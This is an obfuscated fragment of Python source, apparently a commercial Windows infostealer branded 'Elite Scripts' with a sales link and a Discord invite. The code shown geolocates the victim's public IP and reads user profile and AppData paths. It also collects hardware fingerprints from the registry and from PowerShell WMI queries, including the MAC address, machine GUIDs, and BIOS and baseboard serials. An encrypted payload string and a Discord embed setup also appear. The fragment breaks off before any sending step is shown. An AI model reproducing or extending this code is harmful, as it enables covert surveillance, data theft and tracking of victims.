except: HMXCICLUUUAZJSNJJPRWKUKWNNYLRFZZOKVVUFRMISGDMHDSNIUKNALUGSBUSRSMAYRPZIOFBGFOFJBMOVBMTDYCSUXDD = "None"

try: GQQIBMMUAQUOYYHFYSOAQXVXRFDMRHHWFLFXGJMBVDTILRPJRPWJCSZPGOR    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: GQQIBMMUAQUOYYHFYSOAQXVXRFDMRHHWFLFXGJMBVDTILRPJRPWJCSZPGOR = "None"

try: FCWIGGWDXVOQXSKLYALTEPUALSKHTRAIQBHYSGHYAFOTRSUZDALPIBMEKWRXHPKPNYWELBQCJQQQQTZH    = socket.gethostbyname(socket.gethostname())
except: FCWIGGWDXVOQXSKLYALTEPUALSKHTRAIQBHYSGHYAFOTRSUZDALPIBMEKWRXHPKPNYWELBQCJQQQQTZH = "None"

ENSTGFXTLSWNXCAPSXKHTIYZOPEUSUWISXKHAITAVCNBYFANZXBXUWMGTDGHRINADZMFXMEYXKSCEPPJ = r"""
fWE05ZQyLBOC8FzbIR5yml2pYcnn1bpMFMILJwRnOROlLm8Ir/nI1ocnX20tWKMGe4RajA7N13E2tc4MahuG9OMXtz3w8JGe9hTw8Fv0p5Y60G9+TruYKoZBeb+bHdCZCQ++IJEC8qHVZ0YusjHS86GnG7GZb0f3MMIhn5O1eP71lsCVQgMCZ3o3zVCUVwyfTeJWJYY7wNV+cwG8H2WvHA==
"""

ASVMCARLRJDXOCFSSZVFEOAWQDHNWYBTLVTNIQMZKVRBZIMNXQPTCDV            = "nVSyJffEtIOkLQIApTzYGpfNUpYJUVJzgOppgGOKNsXpPThhTxBjacwkyRQHjWVojHwOZubhjxxEUwMOspUcXMGzHhAHsweKNmJJbDMUOAseykMcovSQrLjubYgHkrVIkGToPAgpOUGNXVimcBaGoKxWVTaKyoZUDxjxTn"
UGKWLMDLRNBABFZLBRHWLSYHBUFZDIQCKWRWBKPXYUKYUAEASPPNHT        = "None"
RIXLEQPLMUHMSSKQPPMAGAQPAGTOYFFAWGQWWADVLQJNNTLPOEZMZDMYDWHBZPIVZSSQQZPIIULKGZI    = 0xa80505
ZCNCOZGPXXOICJMAUBKAUBCDZIQMNZOUDYETYKRNAKGUNDQQAJCVRBWBZZHBRWGWGPZZOJVNRSUGZSOZQXRRSFOTUJAKVZSSAWW = "Elite Scripts"
IFISLJOHJJNLKZHKCUXIHVQOJWNFURSZKKHCUZLITEBCGQGXAPMAXSLVNTVKIZPYJVGQPAXJMCBSYCOW   = "https://google.com"
KBICMAEAARZZJSSWCJLBCDUJCLAVGGAHNWRAAELNTSVEBKLVXWDFFRTFQXVVNGGCNCJJDTYTDWFKU    = "Elite Scripts - https://elitescripts.mysellauth.com - https://discord.gg/zsBERfACrf"
KPMZKRUROKOCONHVOAQXJOGAKUNTKOCBPZWNMXTYOOIQBRGVLBWWNUJUHTRIQUCZURVLSBEYZVRRHDVG   = {"text": KBICMAEAARZZJSSWCJLBCDUJCLAVGGAHNWRAAELNTSVEBKLVXWDFFRTFQXVVNGGCNCJJDTYTDWFKU, "icon_url": IFISLJOHJJNLKZHKCUXIHVQOJWNFURSZKKHCUZLITEBCGQGXAPMAXSLVNTVKIZPYJVGQPAXJMCBSYCOW}
UIMORCOYJSBIYTBJFJDTZRFIJUJMEAKAFLLQRCRXETHKYZJDKPYOUORTAAODPJDYHOEQYCWXZFYMZSLVVDOVIOYADY    = f'`{SZCNPOJILKSWMCXDBUMAUATSVEIKOJTLIPJNALNKJHWLNUFRLOFMJEITFPHIUOYDMSYB} "{GQQIBMMUAQUOYYHFYSOAQXVXRFDMRHHWFLFXGJMBVDTILRPJRPWJCSZPGOR}"`'
HYVTIEFNXQGBLJNECPXXVUFBSKQCXIBXJLUAJXFHHINHZGPRPBPHEDJRZPCLPYGFJ    = VOCDSHTBSNYGSKYEWUZBQUZHANBWPXSKNQOAFQKYENXJPVWKYVPKOUJHUAEMXNRPTOEJXSDMPSXYEFQMEWVA(ENSTGFXTLSWNXCAPSXKHTIYZOPEUSUWISXKHAITAVCNBYFANZXBXUWMGTDGHRINADZMFXMEYXKSCEPPJ, ASVMCARLRJDXOCFSSZVFEOAWQDHNWYBTLVTNIQMZKVRBZIMNXQPTCDV)

FQPTDTQEAALWZPVTSEILAVRGIFUEPVVPZRKDWJKWUSHHHJDWPEQCQSOHUANXFDEYJFRXIHOAFDP           = os.getenv("WINDIR", None)
ESGAUWSLPCVQROOBWOZIVMTSLJVKSMHCPAIJIZRMPXRELAHBDPUFDYAZYGIQFYBTMWACVGZNIWJXYLYGTHRUZZZNSNEZFFX       = os.getenv('USERPROFILE', None)
CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY     = os.getenv('LOCALAPPDATA', None)
QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL   = os.getenv('APPDATA', None)
JIFDGZNLAATJFOTHTVZRSGLFPINVQLJCZZKOMWWOTOQKLBZLJFGOLVUFJCHEPPXBKYBGDMGAOHNWKUHYDOCBSSLGFSSEFRNIRR = os.getenv('ProgramFiles(x86)', None)
if JIFDGZNLAATJFOTHTVZRSGLFPINVQLJCZZKOMWWOTOQKLBZLJFGOLVUFJCHEPPXBKYBGDMGAOHNWKUHYDOCBSSLGFSSEFRNIRR is None:
    JIFDGZNLAATJFOTHTVZRSGLFPINVQLJCZZKOMWWOTOQKLBZLJFGOLVUFJCHEPPXBKYBGDMGAOHNWKUHYDOCBSSLGFSSEFRNIRR = os.getenv('ProgramFiles', None)

try:
    EHQBZSOYQBUGXILKNFCAVBUMVDAEUDYCFPXUXGRXUPDGSTBRPUYDRGTFKSSQAMOJZELWYEVNAPNVWAVHIARGKBUV = requests.get(f"https://{UGKWLMDLRNBABFZLBRHWLSYHBUFZDIQCKWRWBKPXYUKYUAEASPPNHT}/api/ip/ip={GQQIBMMUAQUOYYHFYSOAQXVXRFDMRHHWFLFXGJMBVDTILRPJRPWJCSZPGOR}")
    DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY = EHQBZSOYQBUGXILKNFCAVBUMVDAEUDYCFPXUXGRXUPDGSTBRPUYDRGTFKSSQAMOJZELWYEVNAPNVWAVHIARGKBUV.json()

    CLICFSVOZNXLCGIISOLVCVVMMFUWYGJYWMTHSCRZMJCCGPTQBIEOKXQPMASMYZT = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('country', "None")
    CLICFSVOZNXLCGIISOLVCVVMMFUWYGJYWMTHSCRZMJCCGPTQBIEOKXQPMASMYZT_code = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('country_code', "None")
    SIPYGIVNNQJGJDUQIWDOUEEPORKBZLPRRNQNLIVXWQBGLGXVHFCZGUXADBRTXYTSRAYKNHWMYJPFASIZBJDTLFSGJRWARPHDG = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('region', "None")
    SIPYGIVNNQJGJDUQIWDOUEEPORKBZLPRRNQNLIVXWQBGLGXVHFCZGUXADBRTXYTSRAYKNHWMYJPFASIZBJDTLFSGJRWARPHDG_code = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('region_code', "None")
    BMFBSLQUNIOXLVVRKUCVUEJTWXJHUTWETMWBJACABCKIFYQLRXNSKAGMVMORRYNYJCWTFHFNGGODZRTCNJGALQBEAR = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('zip', "None")
    FDHQJQWJGLVTFJKZALVHTQBBECWSRBJEFBHWCRZETCTNDLEXOSHLHGGWVGBZGCEEDFNL = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('city', "None")
    GWNFAZXSMKHFNOIGJWGAPDUGBHGJVZEUUUFPNRWXVQHQNBZETBXYPMZFYGHQCYTUJCURUSEOHCMNQF = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('latitude', "None")
    RVQIYNBWXXEWYSKYQYOJJFCXJWSXSOHXRSDVTTEVWFFYUHGVVNOVKZBTMJFPPWZEUBRNREXUKLUBQELFYQMJJUCDUFDNS = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('longitude', "None")
    MYHFBDHTCBAHTUTGQWQCNPCOMMADLBHUYHRLPINGSRNZEEPNOTPOHPZGTBDGFTLZCLPJVQFEMZHZSW = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('timezone', "None")
    LONSYGUTKLYLLNJFFTSUQCHGALQFVCZCUUQYHEKSLGCCVBVQSDAJMQUFL = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('isp', "None")
    EBBBYXTUBHMHMXFNUOJCMOEUMRTUFLEYTMRQYRGSZKBRVCVBHL = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('org', "None")
    YFSFSIKUVJBQNMWQGMIENHYBVUOSPYHJSVRQOVGJAAFCERLHHJGFQNAIKGZHRYRXCOVEGFWHSBFGGMEW = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('as', "None")
except:
    EHQBZSOYQBUGXILKNFCAVBUMVDAEUDYCFPXUXGRXUPDGSTBRPUYDRGTFKSSQAMOJZELWYEVNAPNVWAVHIARGKBUV = requests.get(f"http://ip-api.com/json/{GQQIBMMUAQUOYYHFYSOAQXVXRFDMRHHWFLFXGJMBVDTILRPJRPWJCSZPGOR}")
    DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY = EHQBZSOYQBUGXILKNFCAVBUMVDAEUDYCFPXUXGRXUPDGSTBRPUYDRGTFKSSQAMOJZELWYEVNAPNVWAVHIARGKBUV.json()

    CLICFSVOZNXLCGIISOLVCVVMMFUWYGJYWMTHSCRZMJCCGPTQBIEOKXQPMASMYZT = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('country', "None")
    CLICFSVOZNXLCGIISOLVCVVMMFUWYGJYWMTHSCRZMJCCGPTQBIEOKXQPMASMYZT_code = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('countryCode', "None")
    SIPYGIVNNQJGJDUQIWDOUEEPORKBZLPRRNQNLIVXWQBGLGXVHFCZGUXADBRTXYTSRAYKNHWMYJPFASIZBJDTLFSGJRWARPHDG = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('regionName', "None")
    SIPYGIVNNQJGJDUQIWDOUEEPORKBZLPRRNQNLIVXWQBGLGXVHFCZGUXADBRTXYTSRAYKNHWMYJPFASIZBJDTLFSGJRWARPHDG_code = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('region', "None")
    BMFBSLQUNIOXLVVRKUCVUEJTWXJHUTWETMWBJACABCKIFYQLRXNSKAGMVMORRYNYJCWTFHFNGGODZRTCNJGALQBEAR = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('zip', "None")
    FDHQJQWJGLVTFJKZALVHTQBBECWSRBJEFBHWCRZETCTNDLEXOSHLHGGWVGBZGCEEDFNL = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('city', "None")
    GWNFAZXSMKHFNOIGJWGAPDUGBHGJVZEUUUFPNRWXVQHQNBZETBXYPMZFYGHQCYTUJCURUSEOHCMNQF = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('lat', "None")
    RVQIYNBWXXEWYSKYQYOJJFCXJWSXSOHXRSDVTTEVWFFYUHGVVNOVKZBTMJFPPWZEUBRNREXUKLUBQELFYQMJJUCDUFDNS = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('lon', "None")
    MYHFBDHTCBAHTUTGQWQCNPCOMMADLBHUYHRLPINGSRNZEEPNOTPOHPZGTBDGFTLZCLPJVQFEMZHZSW = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('timezone', "None")
    LONSYGUTKLYLLNJFFTSUQCHGALQFVCZCUUQYHEKSLGCCVBVQSDAJMQUFL = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('isp', "None")
    EBBBYXTUBHMHMXFNUOJCMOEUMRTUFLEYTMRQYRGSZKBRVCVBHL = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('org', "None")
    YFSFSIKUVJBQNMWQGMIENHYBVUOSPYHJSVRQOVGJAAFCERLHHJGFQNAIKGZHRYRXCOVEGFWHSBFGGMEW = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('as', "None")

def EGTKBTIGJFMLNOSNNQJQQLTDABEMQVNYZLBSWWDWFYLVUWBVLJJRQBL(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT):
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    import winreg

    try: BWORLRQHCTQMGOGHSQGVKIECHAFWLIELZCMXXHJKBDRUSKSVQZCISPRDUPIPEPFYAXDCKNNFIVGDPYRZERBCUUU = platform.system()
    except: BWORLRQHCTQMGOGHSQGVKIECHAFWLIELZCMXXHJKBDRUSKSVQZCISPRDUPIPEPFYAXDCKNNFIVGDPYRZERBCUUU = "None"

    try: GSMNODBQUVIGDRODUAEYXYMMMYBJXGZOLIDYRMHSOFBRNYGAPSSRVASKLRVLXATVLMHHVBDBIDRWCXNHAQFWNZYVCXISKDTCOJ = platform.version()
    except: GSMNODBQUVIGDRODUAEYXYMMMYBJXGZOLIDYRMHSOFBRNYGAPSSRVASKLRVLXATVLMHHVBDBIDRWCXNHAQFWNZYVCXISKDTCOJ = "None"

    try: TZZYNBOXMUUCVTZIQVUPYEJNNNZNSIUJKCPBAWKSQYXWRUZVNTRRQQRRKUDFW = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: TZZYNBOXMUUCVTZIQVUPYEJNNNZNSIUJKCPBAWKSQYXWRUZVNTRRQQRRKUDFW = "None"

    try: EFZSHJOETPBNOHWDVNQSKUIGAONFRRLIRYMJTWYTUYMFIXQFJNWIMDIVCIDYREIKHTZPONLOXEROP = str(round(psutil.virtual_memory().total / (1024**3), 2)) + "Go"
    except: EFZSHJOETPBNOHWDVNQSKUIGAONFRRLIRYMJTWYTUYMFIXQFJNWIMDIVCIDYREIKHTZPONLOXEROP = "None"

    try: JERPUXWOVEYEKJLEBLKWTBZEGEYQYUSHVNWQVTTDSIMPNVTGHUUXPVEKIXFTJWCSEEFEAFIBPIIWOYGCRUUWUUKJ = platform.processor()
    except: JERPUXWOVEYEKJLEBLKWTBZEGEYQYUSHVNWQVTTDSIMPNVTGHUUXPVEKIXFTJWCSEEFEAFIBPIIWOYGCRUUWUUKJ = "None"

    try: EGAPFEDZCBHBEIRSHTBZGNUSAKQZWWGMMCPXNYJZRLEVPYNDIGXETHNPEEQPQHTBIYKMWUOC = str(psutil.cpu_count(logical=False)) + " Core"
    except: EGAPFEDZCBHBEIRSHTBZGNUSAKQZWWGMMCPXNYJZRLEVPYNDIGXETHNPEEQPQHTBIYKMWUOC = "None"

    try: GBHHGBXNVKOLWDISQKGPXCOLKEBOECMDYIMAEFEBLTMNGLKRVIHUPCSNMRFTQGMWCF = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: GBHHGBXNVKOLWDISQKGPXCOLKEBOECMDYIMAEFEBLTMNGLKRVIHUPCSNMRFTQGMWCF = "None"

    DLRRYGAXUBAHVDWWAVUKPKELFIQTDGVFMBCJBXRWFFWTKLBJPDCODTV                 = r"SOFTWARE\Microsoft\Cryptography"
    RNWBEXXHVTNMDJQHMCWETSVPSUYVHGWLVZQADAQAVVTIBYFRMOEHQXELBCCLGEEPWTZL                    = r"SOFTWARE\Microsoft\SQMClient"
    ISGZBNRQGGCWCGSXMLVWTIWVBZHCKQIUIMAOTRGLUQRMVBOIJYGAEIJYSMDTOLH             = r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001"
    DHXKQBCTEVLZSHITAGYIGPEUVRJZMKGIANXBCLZSXCWQZJEKIYMUTQILOPANIKVJRUNPPZCTJD                       = r'SOFTWARE\NVIDIA Corporation'
    DSVTOVEBYHLYRLQNROENHDPSUDBSOUBLCYUEIQVRVJECLZGOUXQWXJBCOQNMOIHMOFQJXAQARLRRWQGTSCEFURAMEEGUCUCMMCR               = r'SYSTEM\HardwareConfig\Current'

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, DLRRYGAXUBAHVDWWAVUKPKELFIQTDGVFMBCJBXRWFFWTKLBJPDCODTV, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineGuid")
            IDAYBPZYCXKSWXZQEMVLEGCIBOILXNRICFOIIIYIKOZRJXTCGUPJBBOXSHKDBDFPKLULTMTVVCYLFQZJLHKDMFFOEMYAA = str(v4r_value).replace("{", "").replace("}", "")
    except: IDAYBPZYCXKSWXZQEMVLEGCIBOILXNRICFOIIIYIKOZRJXTCGUPJBBOXSHKDBDFPKLULTMTVVCYLFQZJLHKDMFFOEMYAA = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, ISGZBNRQGGCWCGSXMLVWTIWVBZHCKQIUIMAOTRGLUQRMVBOIJYGAEIJYSMDTOLH, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "GUID")
            WJZSEBMEPFEPTPJMMBGNWOOFMHSYISVNCGABYNUCOEWDTYUBOCOCA = str(v4r_value).replace("{", "").replace("}", "")
    except: WJZSEBMEPFEPTPJMMBGNWOOFMHSYISVNCGABYNUCOEWDTYUBOCOCA = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, ISGZBNRQGGCWCGSXMLVWTIWVBZHCKQIUIMAOTRGLUQRMVBOIJYGAEIJYSMDTOLH, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "HwProfileGuid")
            XSOGKFFFJROCKAMXPHUNCEKDKNHKZJKWTKFUGWYQGUFYHBCMVRBUBUJDZCUMRFFJWJVELGS = str(v4r_value).replace("{", "").replace("}", "")
    except: XSOGKFFFJROCKAMXPHUNCEKDKNHKZJKWTKFUGWYQGUFYHBCMVRBUBUJDZCUMRFFJWJVELGS = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, RNWBEXXHVTNMDJQHMCWETSVPSUYVHGWLVZQADAQAVVTIBYFRMOEHQXELBCCLGEEPWTZL, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineId")
            LOWDUDDLTCEFZAGVJIJUVVILDMNNKOUKKSMUEWDTIYEHCGLKFXKIKTNUZYFOJIAMRLWWGIVKXWFZPZONLCVPHB = str(v4r_value).replace("{", "").replace("}", "")
    except: LOWDUDDLTCEFZAGVJIJUVVILDMNNKOUKKSMUEWDTIYEHCGLKFXKIKTNUZYFOJIAMRLWWGIVKXWFZPZONLCVPHB = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, DHXKQBCTEVLZSHITAGYIGPEUVRJZMKGIANXBCLZSXCWQZJEKIYMUTQILOPANIKVJRUNPPZCTJD+r'\Installer2', 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemID")
            WRIQCGTTBXBAHGXUYSLUWKAWOWFYGKXIYOZARGLTQERQMYCYEDIBYXRUSDIH = str(v4r_value).replace("{", "").replace("}", "")
    except: WRIQCGTTBXBAHGXUYSLUWKAWOWFYGKXIYOZARGLTQERQMYCYEDIBYXRUSDIH = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, DSVTOVEBYHLYRLQNROENHDPSUDBSOUBLCYUEIQVRVJECLZGOUXQWXJBCOQNMOIHMOFQJXAQARLRRWQGTSCEFURAMEEGUCUCMMCR, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardProduct")
            VJTNWCWQXDNWRHLYJLWLEUOWFLTNFOAOJCAMUOJEYCWKBASQRFEADRTIKDCMNJMJPRLKFQVEALZVOWFFKWWSFIETEOLVXXYXSB = str(v4r_value).replace("{", "").replace("}", "")
    except: VJTNWCWQXDNWRHLYJLWLEUOWFLTNFOAOJCAMUOJEYCWKBASQRFEADRTIKDCMNJMJPRLKFQVEALZVOWFFKWWSFIETEOLVXXYXSB = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, DSVTOVEBYHLYRLQNROENHDPSUDBSOUBLCYUEIQVRVJECLZGOUXQWXJBCOQNMOIHMOFQJXAQARLRRWQGTSCEFURAMEEGUCUCMMCR, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardManufacturer")
            OBHTGSZPAYILXEFOHLQCIMGAGBMYSEDSHZNPPYWHGHREQMVHPWWBWRIHPBJLHLZRDEMCLSHS = str(v4r_value).replace("{", "").replace("}", "")
    except: OBHTGSZPAYILXEFOHLQCIMGAGBMYSEDSHZNPPYWHGHREQMVHPWWBWRIHPBJLHLZRDEMCLSHS = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, DSVTOVEBYHLYRLQNROENHDPSUDBSOUBLCYUEIQVRVJECLZGOUXQWXJBCOQNMOIHMOFQJXAQARLRRWQGTSCEFURAMEEGUCUCMMCR, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSReleaseDate")
            HAPXNDAVECALMLNEVFSNISSAVYEGLTTZBOBBCFECFROETURLEVMMWXVDVUVUMVPPQOGKRMFJ = str(v4r_value).replace("{", "").replace("}", "")
    except: HAPXNDAVECALMLNEVFSNISSAVYEGLTTZBOBBCFECFROETURLEVMMWXVDVUVUMVPPQOGKRMFJ = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, DSVTOVEBYHLYRLQNROENHDPSUDBSOUBLCYUEIQVRVJECLZGOUXQWXJBCOQNMOIHMOFQJXAQARLRRWQGTSCEFURAMEEGUCUCMMCR, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSVersion")
            MCJMWVFNFEDACRQPFCQWCATEYSSMVFWSKWVEUZMWYVHNVRWIJGVYRPBUPGVGHTOL = str(v4r_value).replace("{", "").replace("}", "")
    except: MCJMWVFNFEDACRQPFCQWCATEYSSMVFWSKWVEUZMWYVHNVRWIJGVYRPBUPGVGHTOL = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, DSVTOVEBYHLYRLQNROENHDPSUDBSOUBLCYUEIQVRVJECLZGOUXQWXJBCOQNMOIHMOFQJXAQARLRRWQGTSCEFURAMEEGUCUCMMCR, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemBiosVersion")
            DGYQFGGFDSCHTXAUBVIEDDLMCODZCRLLUHBVWYGAYVLJIZNTLVPIGYSYOYHUYAMDGQA = str(v4r_value).replace("{", "").replace("}", "")
    except: DGYQFGGFDSCHTXAUBVIEDDLMCODZCRLLUHBVWYGAYVLJIZNTLVPIGYSYOYHUYAMDGQA = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, DSVTOVEBYHLYRLQNROENHDPSUDBSOUBLCYUEIQVRVJECLZGOUXQWXJBCOQNMOIHMOFQJXAQARLRRWQGTSCEFURAMEEGUCUCMMCR, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemVersion")
            SMNLIODZVUKPJRARFUITYIDVLBJWOVFKNQUSNRNSCFXFIYEFEQBEIMYGKQGULPWMNDCZWXPOVYIRLEQP = str(v4r_value).replace("{", "").replace("}", "")
    except: SMNLIODZVUKPJRARFUITYIDVLBJWOVFKNQUSNRNSCFXFIYEFEQBEIMYGKQGULPWMNDCZWXPOVYIRLEQP = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, DSVTOVEBYHLYRLQNROENHDPSUDBSOUBLCYUEIQVRVJECLZGOUXQWXJBCOQNMOIHMOFQJXAQARLRRWQGTSCEFURAMEEGUCUCMMCR, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemFamily")
            LLUIEZMBOQKAOBLRXDXBXXPHJROZDOKLDQDNDPLIZHVOSLMJFHDFLZPEODSBBLOAYPZAAINDRCWYHQ = str(v4r_value).replace("{", "").replace("}", "")
    except: LLUIEZMBOQKAOBLRXDXBXXPHJROZDOKLDQDNDPLIZHVOSLMJFHDFLZPEODSBBLOAYPZAAINDRCWYHQ = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, DSVTOVEBYHLYRLQNROENHDPSUDBSOUBLCYUEIQVRVJECLZGOUXQWXJBCOQNMOIHMOFQJXAQARLRRWQGTSCEFURAMEEGUCUCMMCR, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemManufacturer")
            YXZTIFBSMNGMXSVNCIEKBLAHXMHWWZSMKLRMJRXBRFDTUHPASDBLXUGKCLJGJWAJHXTHELVIXYGXRYNSBUMLDYEXMKXG = str(v4r_value).replace("{", "").replace("}", "")
    except: YXZTIFBSMNGMXSVNCIEKBLAHXMHWWZSMKLRMJRXBRFDTUHPASDBLXUGKCLJGJWAJHXTHELVIXYGXRYNSBUMLDYEXMKXG = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, DSVTOVEBYHLYRLQNROENHDPSUDBSOUBLCYUEIQVRVJECLZGOUXQWXJBCOQNMOIHMOFQJXAQARLRRWQGTSCEFURAMEEGUCUCMMCR, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemProductName")
            FXHBOPCILJDWIABUCBXEQLKFGITFSGGDSPEODIBCOTXNSGVZGKDBYSOXRSDVRYLOUZIBJWKFHXFGZTVGIDXYUNFAA = str(v4r_value).replace("{", "").replace("}", "")
    except: FXHBOPCILJDWIABUCBXEQLKFGITFSGGDSPEODIBCOTXNSGVZGKDBYSOXRSDVRYLOUZIBJWKFHXFGZTVGIDXYUNFAA = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, DSVTOVEBYHLYRLQNROENHDPSUDBSOUBLCYUEIQVRVJECLZGOUXQWXJBCOQNMOIHMOFQJXAQARLRRWQGTSCEFURAMEEGUCUCMMCR, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemSKU")
            IOZSSBQZUFSBJGUVKGNZFJVMNCOQCBHVGRNHASIFZKRJFPORCRLTAWUWORFBHPPVZAEVHEKJLXWDYFHRG = str(v4r_value).replace("{", "").replace("}", "")
    except: IOZSSBQZUFSBJGUVKGNZFJVMNCOQCBHVGRNHASIFZKRJFPORCRLTAWUWORFBHPPVZAEVHEKJLXWDYFHRG = None

    def RunPowershell(query):
        try:
            result = subprocess.check_output(
                ['powershell', '-Command', query],
                stderr=subprocess.STDOUT,
                text=True
            ).split('\n')[0].strip()
            return result if result else None
        except:
            return None

    try: WSJPYRESSIKWCCWJPJXRTQNPPIKMPQOKQTQDAGQGPCHWUQTESKAFOISONRBIEHEACPSSGINQQDWGRTISFRKTXINV = RunPowershell("(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID")
    except: WSJPYRESSIKWCCWJPJXRTQNPPIKMPQOKQTQDAGQGPCHWUQTESKAFOISONRBIEHEACPSSGINQQDWGRTISFRKTXINV = None

    try: FAXCCWDCHHKJSZYBOWTGAZSXNGLZIYIOLGBNLKPUCHGJMHEXAOSXXAPWLHOXGFIQFYLVALDNCWHQVETMLZCR = RunPowershell("(Get-WmiObject -Class Win32_BIOS).SerialNumber")
    except: FAXCCWDCHHKJSZYBOWTGAZSXNGLZIYIOLGBNLKPUCHGJMHEXAOSXXAPWLHOXGFIQFYLVALDNCWHQVETMLZCR = None

    try: YSGXSNUQHQFAADYRLZQYGAUCZQQXLGRRPJOTYASGSYIRIMXJOUFRQCNSUTBOFCRKNUQOAPP = RunPowershell("(Get-WmiObject -Class Win32_BaseBoard).SerialNumber")
    except: YSGXSNUQHQFAADYRLZQYGAUCZQQXLGRRPJOTYASGSYIRIMXJOUFRQCNSUTBOFCRKNUQOAPP = None

